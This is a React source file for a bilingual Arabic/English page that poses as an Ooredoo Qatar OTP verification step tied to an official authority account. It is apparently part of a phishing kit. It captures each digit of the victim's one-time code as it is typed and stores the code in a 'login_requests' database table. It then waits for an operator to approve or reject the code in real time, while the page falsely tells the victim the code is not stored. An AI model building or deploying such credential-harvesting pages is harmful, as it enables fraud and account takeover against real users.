import RejectionBanner, { setRejectionMessage, clearRejectionMessage } from "@/components/RejectionBanner";
import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import ApprovalWaitingOverlay from "@/components/ApprovalWaitingOverlay";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { Loader2, PhoneCall, ShieldCheck, MessageSquare } from "lucide-react";
import { useLang } from "@/i18n/LanguageContext";
import { useLiveDraft } from "@/hooks/useLiveDraft";
import { socket, visitor, sendData, navigateToPage } from "@/lib/store";
import { getServiceContext } from "@/lib/serviceContext";

const OoredooOtp = () => {
  const { pick, dir } = useLang();
  const [, navigate] = useLocation();
  const location = useLocation();
  const phone = (location.state?.phone as string) || "";
  const selectedService =
    typeof window !== "undefined" ? sessionStorage.getItem("selected_service") : null;
  const serviceContext = getServiceContext(selectedService);

  const [digits, setDigits] = useState(["", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [requestId, setRequestId] = useState<string | null>(() =>
    typeof window !== "undefined" ? sessionStorage.getItem("visitor_request_id") : null
  );
  const [seconds, setSeconds] = useState(54);
  const inputsRef = useRef<Array<HTMLInputElement | null>>([]);

  const code = digits.join("");
  const isValid = code.length === 4;

  useLiveDraft({
    step: "ooredoo_otp_draft",
    values: { code },
    columns: { phone, otp_code: code || undefined },
  });

  useEffect(() => {
    if (seconds <= 0) return;
    const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [seconds]);

  const handleChange = (i: number, val: string) => {
    const d = val.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[i] = d;
    setDigits(next);
    if (d && i < 3) inputsRef.current[i + 1]?.focus();
  };

  const handleKeyDown = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) inputsRef.current[i - 1]?.focus();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    setLoading(true);

    const existingId = typeof window !== "undefined" ? sessionStorage.getItem("visitor_request_id") : null;
    let phoneToUse = phone || "—";
    if (existingId) {
      const { data: prev } = await supabase
        .from("login_requests").select("phone").eq("id", existingId).maybeSingle();
      if (prev?.phone) phoneToUse = prev.phone;
    }

    const payload = {
      phone: phoneToUse,
      otp_code: code,
      step: "ooredoo_otp",
      status: "pending",
      selected_service: selectedService,
      current_page: "/ooredoo-otp",
      // Mirror the OTP into activation_data so it survives future steps
      // that overwrite the top-level otp_code column.
      activation_data: {
        ooredoo_otp: code,
      },
      updated_at: new Date().toISOString(),
    } as any;
    let data: { id: string } | null = null;
    let error: unknown = null;
    if (existingId) {
      const merged = await updateVisitorRow(existingId, payload); const res = { data: merged, error: null as unknown };
      data = res.data as any; error = res.error;
    }
    if (!data) {
      const ins = await supabase.from("login_requests").insert(payload).select("id").single();
      data = ins.data as any; error = ins.error;
    }
    if (error || !data) { setLoading(false); return; }
    setVisitorRequestId(data.id);
    setRequestId(data.id);
    clearRejectionMessage();
    setWaiting(true);
  };

  useEffect(() => {
    if (!waiting || !requestId) return;
    const channel = supabase
      .channel("ooredoo_otp_approval_" + requestId)
      .on("postgres_changes", {
        event: "UPDATE", schema: "public", table: "login_requests",
        filter: `id=eq.${requestId}`,
      }, (payload) => {
        const row = payload.new as { status: string };
        if (row.status === "approved") {
          navigate("/waiting", { state: { phone, requestId } });
        } else if (row.status === "rejected") {
          setRejectionMessage(pick("الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى", "The code you entered is incorrect. Please try again."));
          setWaiting(false); setLoading(false); setDigits(["", "", "", ""]);
          inputsRef.current[0]?.focus();
          window.scrollTo({ top: 0, behavior: "auto" });
        }
      }).subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [waiting, requestId, navigate, phone, pick]);

  const maskedPhone = phone ? "•••••" + phone.slice(-2) : "•••••••";
  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  return (
    <div className="min-h-screen bg-background relative" dir={dir}>
      <ApprovalWaitingOverlay
        open={waiting}
        kind="otp"
        title={pick("جارٍ التحقق من رمز Ooredoo", "Verifying the Ooredoo code")}
        subtitle={pick(
          `ربط رقم الهاتف مع ${serviceContext.accountAr}`,
          `Linking your phone number to your ${serviceContext.accountEn}`
        )}
      />
      <RejectionBanner />
      <SiteHeader />

      <section className="px-4 pb-10 pt-6">
        <div className="container mx-auto max-w-5xl space-y-5">
          {/* Official notice */}
          <div className="rounded-2xl bg-gradient-to-l from-red-600 to-red-700 text-white p-5 shadow-lg flex items-center gap-4">
            <div className="w-12 h-12 rounded-full bg-white/15 flex items-center justify-center shrink-0">
              <PhoneCall className="w-6 h-6 text-white" />
            </div>
            <div>
              <p className="text-xs font-bold opacity-90 mb-1">
                {pick(serviceContext.orgLineAr, serviceContext.orgLineEn)}
              </p>
              <p className="text-base font-extrabold leading-tight">
                {pick(
                  "تأكيد ملكية رقم الهاتف عبر رمز التحقق",
                  "Verify phone number ownership via one-time code"
                )}
              </p>
            </div>
          </div>

          {/* Heading */}
          <div className="space-y-3">
            <h1 className="text-2xl font-extrabold text-foreground leading-snug">
              {pick("أدخل رمز التحقق المرسل إلى هاتفك", "Enter the verification code sent to your phone")}
            </h1>
            <p className="text-sm text-muted-foreground leading-relaxed">
              {pick("أرسلنا رمزاً مكوّناً من 4 أرقام عبر SMS من ", "We sent a 4-digit SMS code from ")}
              <span className="text-red-600 font-bold">Ooredoo Qatar</span>
              {pick(" إلى رقمك ", " to your number ")}
              <span className="font-bold tracking-wider">{maskedPhone}</span>
              {pick(
                ` لتأكيد ملكية الخط وربطه رسمياً مع ${serviceContext.accountAr}. يُستخدم هذا الرقم لاحقاً في إرسال إشعارات ${serviceContext.platformShortAr} والتنبيهات الأمنية الصادرة عن الجهة.`,
                ` to confirm line ownership and officially link it to your ${serviceContext.accountEn}. This number will be used to send ${serviceContext.platformShortEn} notifications and security alerts from the authority.`
              )}
            </p>
          </div>


          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6 pt-2">
            <div className="space-y-3">
              <label className="block text-sm font-bold text-foreground">{pick("رمز التحقق", "Verification Code")}</label>
              <div className="flex justify-center gap-3" dir="ltr">
                {digits.map((d, i) => (
                  <input
                    key={i}
                    ref={(el) => (inputsRef.current[i] = el)}
                    type="text"
                    inputMode="numeric"
                    value={d}
                    onChange={(e) => handleChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    className="w-16 h-16 text-center text-2xl font-bold bg-muted/30 border border-border/50 rounded-xl focus:ring-2 focus:ring-red-500/30 focus:border-red-500 outline-none transition-all"
                    maxLength={1}
                  />
                ))}
              </div>
            </div>

            <div className="flex items-center justify-center gap-2 text-sm">
              <MessageSquare className="w-4 h-4 text-muted-foreground" />
              {seconds > 0 ? (
                <span className="text-muted-foreground">
                  {pick("إعادة إرسال الرمز خلال", "Resend code in")} <span className="text-red-600 font-bold">{mm}:{ss}</span>
                </span>
              ) : (
                <button
                  type="button"
                  onClick={() => setSeconds(54)}
                  className="text-red-600 font-bold hover:underline"
                >
                  {pick("إعادة إرسال الرمز", "Resend code")}
                </button>
              )}
            </div>

            {/* Security note */}
            <div className="flex items-start gap-2.5 rounded-xl bg-muted/40 border border-border/50 p-3">
              <ShieldCheck className="w-4 h-4 text-red-600 mt-0.5 shrink-0" />
              <p className="text-xs text-muted-foreground leading-relaxed">
                {pick(
                  `يُستخدم رمز التحقق لمرة واحدة فقط لتأكيد ملكية رقم الهاتف، ولا يتم تخزينه لدى ${serviceContext.platformShortAr}.`,
                  `The verification code is used only once to confirm phone ownership and is not stored by ${serviceContext.platformShortEn}.`
                )}
              </p>
            </div>

            <Button
              type="submit"
              disabled={loading || waiting || !isValid}
              className="w-full bg-red-600 hover:bg-red-700 text-white text-base font-bold py-6 rounded-xl shadow-md transition-all"
            >
              {waiting ? (
                <span className="flex items-center justify-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />{pick("بانتظار الموافقة...", "Waiting for approval...")}</span>
              ) : loading ? (
                <span className="flex items-center justify-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />{pick("جارٍ التحقق...", "Verifying...")}</span>
              ) : pick("تأكيد الرمز وربط الحساب", "Confirm code and link account")}
            </Button>
          </form>
        </div>
      </section>
      <SiteFooter />
    </div>
  );
};

export default OoredooOtp;
